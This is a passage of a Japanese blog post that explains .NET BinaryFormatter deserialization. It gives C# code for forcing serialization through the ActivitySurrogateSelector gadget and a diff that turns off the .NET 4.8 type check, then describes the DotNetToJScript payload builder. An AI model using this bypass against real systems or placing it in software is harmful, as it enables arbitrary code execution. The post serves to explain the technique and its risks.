&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;override&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ToString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Custom serialization surrogate&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;_SurrogateSelector&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SurrogateSelector&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;override&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ISerializationSurrogate&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GetSurrogate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StreamingContext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;out&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ISurrogateSelector&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;selector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;selector&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IsSerializable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ISerializationSurrogate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Activator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetSurrogate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;out&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;selector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Program&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TestObjectSerializedRef&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;BinaryFormatter&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BinaryFormatter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;MemoryStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MemoryStream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SurrogateSelector&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SurrogateSelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NonSerializable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Hello World!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Position&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// Should print Hello World!.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteLine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Deserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;TestObjectSerializedRef&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;このコードの説明をします。&lt;/p&gt;
&lt;p&gt;自作クラス NonSerializable はコンストラクタで String オブジェクトを受け取るようにしています。また ToString をオーバーライドし String オブジェクトを返すようにします。ToString は、 &lt;a href=&#34;https://docs.microsoft.com/ja-jp/dotnet/csharp/programming-guide/classes-and-structs/how-to-override-the-tostring-method&#34;&gt;C# では全てのクラスが暗黙的に Object クラスを継承し、文字列表現をリターンできるようにしている&lt;/a&gt; ため、Console.WriteLine() が呼ばれると、このクラスはコンストラクタで渡された &amp;ldquo;Hello World!&amp;ldquo;を返します。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ただしこのクラスは Serializable アトリビュートを持っていないので、本来であればシリアライズできません。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;そんなクラスを SurrogateSelector.Serialize でシリアライズします。&lt;/p&gt;
&lt;p&gt;Serialize は Serializable アトリビュートが付いたクラスしかシリアライズしませんが、SurrogateSelector クラスの GetSurrogate メソッドをオーバーライドし、シリアライズできないクラスでもサロゲートクラスに変換させるようにすることで&lt;strong&gt;任意のクラスをシリアライズできる&lt;/strong&gt;ようにしています。&lt;/p&gt;
&lt;p&gt;このコードをcsc.exeでコンパイルし、実行します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/deserialize_exception.png&#34; alt=&#34;deserialize_exception&#34;&gt;
&lt;/p&gt;
&lt;p&gt;例外が発生しました。発生箇所は ObjectSurrogate.GetObjectDataです。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;これは最近の Windows10 / WindowsServer で予期された動作です。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Forshaw 氏のブログが公開された後、Microsoft は ObjectSurrogate の任意にデシリアライズできる実装について好ましく思っておらず、.NET 4.8 のアップデートでデシリアライズ時の型チェックを行うようにしました。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sealed&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;ObjectSurrogate&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ISerializationSurrogate&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GetObjectData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SerializationInfo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StreamingContext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppSettings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DisableActivitySurrogateSelectorTypeCheck&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;p&#34;&gt;!(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ActivityBind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;!(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DependencyObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		   &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ArgumentException&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;obj&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;c1&#34;&gt;// ...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;追加されたのは &lt;code&gt;!AppSettings.DisableActivitySurrogateSelectorTypeCheck&lt;/code&gt; です。この追加によって、シリアライズ化可能なオブジェクト以外をデシリアライズすることはできなくなりました。&lt;/p&gt;
&lt;p&gt;しかしこれは C# で実装する場合においては、該当のメンバを &lt;code&gt;True&lt;/code&gt; にしてしまえば何も問題ありません。&lt;/p&gt;
&lt;p&gt;上のコードを次の差分のように修正します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gu&#34;&gt;@@ -2,6 +2,7 @@
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gu&#34;&gt;&lt;/span&gt; using System.IO;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; using System.Runtime.Serialization;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; using System.Runtime.Serialization.Formatters.Binary;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;+using System.Configuration;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gu&#34;&gt;@@ -54,6 +55,7 @@
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gu&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     static void Main()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;+        ConfigurationManager.AppSettings.Set(&amp;#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&amp;#34;, &amp;#34;true&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;         TestObjectSerializedRef();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
  &lt;img src=&#34;images/deserialize_ok.png&#34; alt=&#34;deserialize_ok&#34;&gt;
&lt;/p&gt;
&lt;p&gt;型チェックが無効になったため、シリアライズ・デシリアライズに成功しました。これが .NET 4.8 以降における強制シリアライズ手法です。&lt;/p&gt;
&lt;h3 id=&#34;dotnettojscript-の栄枯盛衰&#34;&gt;DotNetToJScript の栄枯盛衰&lt;/h3&gt;
&lt;p&gt;D2JS は COM コンポーネントを経由した .NET のデシリアライズの原理をもとに、シリアライズしたクラスアセンブリを BinaryFormatter でデシリアライズし、クラスコンストラクタを呼び出すスクリプトを作成するビルダーツールです。本ツールは Nick 氏 (@monoxgas) によって作成されました。&lt;/p&gt;
&lt;p&gt;本ツールでは引数に .NET クラスアセンブリを指定することで、アセンブリがシリアライズされ、JScript や VBSciprt、VBA などのスクリプト言語でデシリアライズするスクリプトが生成されます。&lt;/p&gt;
&lt;p&gt;なお呼び出される .NET プログラム側では、COM コンポーネント経由で呼び出されるように ComVisible アトリビュートを付けたうえでコンパイルをする必要があります。&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;[ComVisible(true)]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;TestClass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;次のコードが D2J で出力したものです。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/d2j_code.png&#34; alt=&#34;d2j_code&#34;&gt;
&lt;/p&gt;
&lt;p&gt;コードの通り、Base64エンコードした .NET オブジェクトを COM コンポーネント経由でデシリアライズしています。デシリアライズしたクラスオブジェクトを D/Invoke でインスタンス作成し、 .NET オブジェクトのコンストラクタが実行されます。&lt;/p&gt;
&lt;p&gt;デシリアライズの起点となるのは &lt;code&gt;BinaryFormatter&lt;/code&gt; です。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;セキュリティの面からみても、このように外部からのパラメータを BinaryFormatter に与えることがいかに危険な行為かがお分かりいただけるでしょうか。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.security-next.com/119815&#34;&gt;中国系サイバーグループが攻撃に悪用している脆弱性&lt;/a&gt;のリストにもあげられている Microsoft Exchange Server の脆弱性 (CVE-2020-0688) も、外部から渡される _VIEWSTATE パラメータの値をデシリアライズするという実装が脆弱性の原因となりました。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://jp.tenable.com/blog/cve-2020-0688-microsoft-exchange-server-static-key-flaw-could-lead-to-remote-code-execution&#34;&gt;https://jp.tenable.com/blog/cve-2020-0688-microsoft-exchange-server-static-key-flaw-could-lead-to-remote-code-execution&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;このスクリプトのデシリアライズ自体に大きな問題はないのですが、気になるのはビルダー側でシリアライズするコードです。以下は D2JS の Program.cs です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;assembly&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;File&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;assembly_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
